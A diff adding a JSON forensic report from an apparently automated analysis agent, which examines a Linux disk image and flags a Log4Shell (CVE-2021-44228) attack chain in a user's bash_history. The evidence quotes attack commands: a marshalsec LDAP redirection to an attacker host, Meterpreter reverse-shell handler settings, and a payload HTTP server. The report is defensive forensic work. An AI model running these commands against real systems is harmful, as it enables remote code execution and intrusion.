@@ -1,0 +1,296 @@
+{
+  "agent_verdict": "SUSPICION",
+  "analysis_timestamp": "2026-07-13T01:58:07.518395+00:00",
+  "audit_trail": {
+    "agent_version": "1.0.0-SANS-2026",
+    "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+    "end_time": "2026-07-13T01:58:07.518402+00:00",
+    "entries": [
+      {
+        "action": "AGENT_INITIALIZED",
+        "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+        "entry_sha256": "4022235bc05ea5c49382e1af5365e88ab43a0fefd96b742f961ca0c9e9bcaba8",
+        "inputs_summary": {
+          "agent_file": "/home/labestiadevigia/vigia-repo/vigia_agent.py",
+          "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL"
+        },
+        "iteration": 0,
+        "note": "Agent initialized \u2014 source SHA-256: 303875284b7873bf...",
+        "outputs_summary": {
+          "agent_sha256": "303875284b7873bffed00aa0ec5a56462cf23cf359f4158378b7cd37d2b13120",
+          "agent_version": "1.0.0-SANS-2026"
+        },
+        "seq": 1,
+        "timestamp": "2026-07-13T01:58:07.151175+00:00",
+        "tool": "vigia_agent"
+      },
+      {
+        "action": "EVIDENCE_INTEGRITY_CHECK",
+        "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+        "entry_sha256": "1b2c77ec1b45aca40271f21d65e5d848a3971ccc26b707089c210d480d322d0d",
+        "inputs_summary": {
+          "path": "/home/labestiadevigia/vigia-repo/data/cases/VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL.json"
+        },
+        "iteration": 0,
+        "note": "Computing SHA-256 of original evidence",
+        "outputs_summary": {},
+        "seq": 2,
+        "timestamp": "2026-07-13T01:58:07.151267+00:00",
+        "tool": "sha256_hasher"
+      },
+      {
+        "action": "EVIDENCE_INTEGRITY_CHECK",
+        "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+        "entry_sha256": "f26a98d4ef05a84d0091afdf88d6c6bc4ff4956b8cf2493dbd2929b81e319721",
+        "inputs_summary": {
+          "path": "/home/labestiadevigia/vigia-repo/data/cases/VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL.json"
+        },
+        "iteration": 0,
+        "note": "Evidence verified: 4861a10f09179169...",
+        "outputs_summary": {
+          "sha256": "4861a10f09179169996a01e49c3797cdc160be892c583510b3c7dd4285c3fbc5"
+        },
+        "seq": 3,
+        "timestamp": "2026-07-13T01:58:07.151358+00:00",
+        "tool": "sha256_hasher"
+      },
+      {
+        "action": "PIPELINE_EXECUTE",
+        "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+        "entry_sha256": "afae1aeb5764ad70add4f418f2a59aac938c225e46d9ed0a168a10dca192896c",
+        "inputs_summary": {
+          "evidence": "/home/labestiadevigia/vigia-repo/data/cases/VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL.json",
+          "iteration": "0",
+          "params": {}
+        },
+        "iteration": 0,
+        "note": "Executing pipeline \u2014 iteration 0",
+        "outputs_summary": {},
+        "seq": 4,
+        "timestamp": "2026-07-13T01:58:07.151461+00:00",
+        "tool": "vigia_pipeline"
+      },
+      {
+        "action": "PIPELINE_COMPLETE",
+        "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+        "entry_sha256": "1107f9d915ed0893669e14b4195e07f002c6d84168f8279651f5ce1876a5ac34",
+        "inputs_summary": {
+          "iteration": "0"
+        },
+        "iteration": 0,
+        "note": "Pipeline completed \u2014 4 signals",
+        "outputs_summary": {
+          "abduction": {
+            "best_hypothesis": "SUSPICION_DETECTED",
+            "best_posterior": "61/100",
+            "confidence": "61/100",
+            "is_conclusive": "True",
+            "narrative": "Ubuntu 21.10 disk image. User rafael has Log4Shell (CVE-2021-44228) attack tools: marshalsec LDAP server, apache-log4j-rce-poc, msfconsole reverse shell handlers. bash_history documents complete attac..."
+          },
+          "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+          "pipeline_meta": {
+            "artifact_count": "4",
+            "avg_score": "1629/2000",
+            "ebs_adapter_mode": "motor",
+            "expected_verdict": "SUSPICION",
+            "resolve": {
+              "motor_confidence": "0.61",
+              "motor_reason": "Significant signal with structural support (score=0.3037)",
+              "motor_score": "0.3037",
+              "motor_verdict": "SUSPICION",
+              "selection_function": "vigia_scorer._vigia_score (Aliseda selection)"
+            },
+            "source": "ebs_v1_json_adapter"
+          },
+          "signals": [
+            {
+              "artifact_id": "MAGNET-2022-LINUX-A01",
+              "confidence": "9/10",
+              "description": "bash_history: java -cp marshalsec.jar LDAPRefServer http://192.168.191.253:8000/#Log4jRCE \u2014 LDAP redirection server for Log4Shell CVE-2021-44228. Redirects JNDI lookup from vulnerable Java process to ",
+              "evidence_type": "log_entry",
+              "source": "ewf_mount_filesystem_analysis",
+              "z_score": "171/200"
+            },
+            {
+              "artifact_id": "MAGNET-2022-LINUX-A02",
+              "confidence": "9/10",
+              "description": "bash_history: msfconsole multi/handler with payload windows/x64/meterpreter/reverse_tcp lhost=192.168.191.253 lport=443; second handler lport=444 \u2014 active reverse shell listener configured and running",
+              "evidence_type": "log_entry",
+              "source": "ewf_mount_filesystem_analysis",
+              "z_score": "207/250"
+            },
+            {
+              "artifact_id": "MAGNET-2022-LINUX-A03",
+              "confidence": "9/10",
+              "description": "home/rafael/ contains: apache-log4j-rce-poc/ directory (proof-of-concept exploit for CVE-2021-44228), marshalsec/ directory with compiled marshalsec.jar \u2014 attack tools preinstalled and ready. Presence",
+              "evidence_type": "file_metadata",
+              "source": "ewf_mount_filesystem_analysis",
+              "z_score": "81/100"
+            },
+            {
+              "artifact_id": "MAGNET-2022-LINUX-A04",
+              "confidence": "9/10",
+              "description": "bash_history: python3 -m http.server \u2014 payload delivery server active on 192.168.191.253:8000 concurrent with LDAP server. This is the HTTP server that delivers the malicious Java class file (Log4jRCE",
+              "evidence_type": "log_entry",
+              "source": "ewf_mount_filesystem_analysis",
+              "z_score": "153/200"
+            }
+          ]
+        },
+        "seq": 5,
+        "timestamp": "2026-07-13T01:58:07.517991+00:00",
+        "tool": "vigia_pipeline"
+      },
+      {
+        "action": "CONTRADICTION_CHECK",
+        "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+        "entry_sha256": "fe8fa700db5c4a3820f1b911d51b8cf572b438bb8097a1434099398702382831",
+        "inputs_summary": {
+          "n_signals": "4"
+        },
+        "iteration": 0,
+        "note": "0 contradiction(s) \u2014 below threshold 2, no correction",
+        "outputs_summary": {
+          "contradictions_found": "0",
+          "threshold": "2"
+        },
+        "seq": 6,
+        "timestamp": "2026-07-13T01:58:07.518135+00:00",
+        "tool": "contradiction_detector"
+      },
+      {
+        "action": "AGENT_EXIT",
+        "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+        "entry_sha256": "4c78af1f5d76a5b3a480e2670a33994fbfb2ed2b8b7a057766887b6462c82607",
+        "inputs_summary": {
+          "verdict": "SUSPICION_DETECTED"
+        },
+        "iteration": 0,
+        "note": "Exit code 5 (SUSPICION) \u2014 analysis complete.",
+        "outputs_summary": {
+          "agent_verdict": "SUSPICION",
+          "exit_code": "5"
+        },
+        "seq": 7,
+        "timestamp": "2026-07-13T01:58:07.518344+00:00",
+        "tool": "vigia_agent"
+      }
+    ],
+    "start_time": "2026-07-13T01:58:07.150941+00:00",
+    "total_entries": 7
+  },
+  "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+  "evidence_path": "/home/labestiadevigia/vigia-repo/data/cases/VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL.json",
+  "evidence_sha256": "4861a10f09179169996a01e49c3797cdc160be892c583510b3c7dd4285c3fbc5",
+  "iterations_executed": 1,
+  "narrative": "=== VIG\u00cdA FORENSIC AGENT \u2014 CASE VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL ===\nEvidence: /home/labestiadevigia/vigia-repo/data/cases/VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL.json\nEvidence SHA-256: 4861a10f09179169996a01e49c3797cdc160be892c583510b3c7dd4285c3fbc5\nAnalysis iterations: 1\nSelf-corrections applied: 0\n\n--- MAIN HYPOTHESIS ---\nHypothesis: SUSPICION_DETECTED\nPosterior confidence: 61/100\nConclusive: YES\n\n--- PEIRCEAN NARRATIVE ---\n[FIRSTNESS] 4 se\u00f1al(es): 4 primaria(s) de ['ewf_mount_filesystem_analysis'], 0 derivada(s)/no-analizada(s). Top z: bash_history: java -cp marshalsec.jar LD=0.85, bash_history: msfconsole multi/handler w=0.83, home/rafael/ contains: apache-log4j-rce-=0.81.\n[SECONDNESS] Ninguna se\u00f1al primaria supera z>2 \u2014 sin desviaci\u00f3n estructural contra baseline en esta iteraci\u00f3n.\n[THIRDNESS] Hip\u00f3tesis: SUSPICION_DETECTED. Conclusiva: s\u00ed.\n\nRazonamiento del motor abductivo:\nUbuntu 21.10 disk image. User rafael has Log4Shell (CVE-2021-44228) attack tools: marshalsec LDAP server, apache-log4j-rce-poc, msfconsole reverse shell handlers. bash_history documents complete attack chain against 192.168.191.144: LDAP redirection server, payload HTTP server, and active Meterpreter reverse shell listeners on ports 443 and 444.\n\n--- TOP SIGNALS (top 5 by z-score) ---\n  [bash_history: java -cp marshalsec.jar LDAPRefServer http://192.168.191] z=0.855 conf=0.90 \u2014 \n  [bash_history: msfconsole multi/handler with payload windows/x64/meterp] z=0.828 conf=0.90 \u2014 \n  [home/rafael/ contains: apache-log4j-rce-poc/ directory (proof-of-conce] z=0.810 conf=0.90 \u2014 \n  [bash_history: python3 -m http.server \u2014 payload delivery server active ] z=0.765 conf=0.90 \u2014 \n\n--- FINAL ALERT LEVEL ---\nMEDIUM \u2014 SUSPICION verdict with individual z-scores below threshold. Alert floored (B-028/B-065): an intent-class finding cannot present as LOW.\nReconciliation: verdict SUSPICION rests on hypothesis-level aggregation, not on any single high-magnitude signal. Per-signal magnitude level was: LOW (per-signal magnitude) \u2014 no individual primary signal exceeds z>2 in this iteration.\n\nCritical signals (z>3, primary): 0\nHigh signals (2<z<=3, primary): 0\nPrimary signals: 4 | Derived: 0 | Total: 4",
+  "pipeline_results": {
+    "abduction": {
+      "best_hypothesis": "SUSPICION_DETECTED",
+      "best_posterior": "61/100",
+      "confidence": {
+        "__fraction__": true,
+        "den": 100,
+        "num": 61
+      },
+      "is_conclusive": true,
+      "narrative": "Ubuntu 21.10 disk image. User rafael has Log4Shell (CVE-2021-44228) attack tools: marshalsec LDAP server, apache-log4j-rce-poc, msfconsole reverse shell handlers. bash_history documents complete attack chain against 192.168.191.144: LDAP redirection server, payload HTTP server, and active Meterpreter reverse shell listeners on ports 443 and 444."
+    },
+    "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+    "pipeline_meta": {
+      "artifact_count": 4,
+      "avg_score": "1629/2000",
+      "ebs_adapter_mode": "motor",
+      "expected_verdict": "SUSPICION",
+      "resolve": {
+        "motor_confidence": "0.61",
+        "motor_reason": "Significant signal with structural support (score=0.3037)",
+        "motor_score": "0.3037",
+        "motor_verdict": "SUSPICION",
+        "selection_function": "vigia_scorer._vigia_score (Aliseda selection)"
+      },
+      "source": "ebs_v1_json_adapter"
+    },
+    "signals": [
+      {
+        "artifact_id": "MAGNET-2022-LINUX-A01",
+        "confidence": {
+          "__fraction__": true,
+          "den": 10,
+          "num": 9
+        },
+        "description": "bash_history: java -cp marshalsec.jar LDAPRefServer http://192.168.191.253:8000/#Log4jRCE \u2014 LDAP redirection server for Log4Shell CVE-2021-44228. Redirects JNDI lookup from vulnerable Java process to ",
+        "evidence_type": "log_entry",
+        "source": "ewf_mount_filesystem_analysis",
+        "z_score": {
+          "__fraction__": true,
+          "den": 200,
+          "num": 171
+        }
+      },
+      {
+        "artifact_id": "MAGNET-2022-LINUX-A02",
+        "confidence": {
+          "__fraction__": true,
+          "den": 10,
+          "num": 9
+        },
+        "description": "bash_history: msfconsole multi/handler with payload windows/x64/meterpreter/reverse_tcp lhost=192.168.191.253 lport=443; second handler lport=444 \u2014 active reverse shell listener configured and running",
+        "evidence_type": "log_entry",
+        "source": "ewf_mount_filesystem_analysis",
+        "z_score": {
+          "__fraction__": true,
+          "den": 250,
+          "num": 207
+        }
+      },
+      {
+        "artifact_id": "MAGNET-2022-LINUX-A03",
+        "confidence": {
+          "__fraction__": true,
+          "den": 10,
+          "num": 9
+        },
+        "description": "home/rafael/ contains: apache-log4j-rce-poc/ directory (proof-of-concept exploit for CVE-2021-44228), marshalsec/ directory with compiled marshalsec.jar \u2014 attack tools preinstalled and ready. Presence",
+        "evidence_type": "file_metadata",
+        "source": "ewf_mount_filesystem_analysis",
+        "z_score": {
+          "__fraction__": true,
+          "den": 100,
+          "num": 81
+        }
+      },
+      {
+        "artifact_id": "MAGNET-2022-LINUX-A04",
+        "confidence": {
+          "__fraction__": true,
+          "den": 10,
+          "num": 9
+        },
+        "description": "bash_history: python3 -m http.server \u2014 payload delivery server active on 192.168.191.253:8000 concurrent with LDAP server. This is the HTTP server that delivers the malicious Java class file (Log4jRCE",
+        "evidence_type": "log_entry",
+        "source": "ewf_mount_filesystem_analysis",
+        "z_score": {
+          "__fraction__": true,
+          "den": 200,
+          "num": 153
+        }
+      }
+    ]
+  },
+  "sans_compliance": {
+    "accuracy_validation": true,
+    "analytical_reasoning": true,
+    "architectural_guardrails": true,
+    "audit_trail": true,
+    "evidence_integrity": true,
+    "self_correction": false
+  },
+  "self_corrections_applied": 0,
+  "signal_stats": {
+    "n_primary_signals": 4,
+    "n_total_signals": 4,
+    "n_unanalyzed_artifacts": 0
+  },
+  "vigia_agent_version": "1.0.0-SANS-2026"
+}
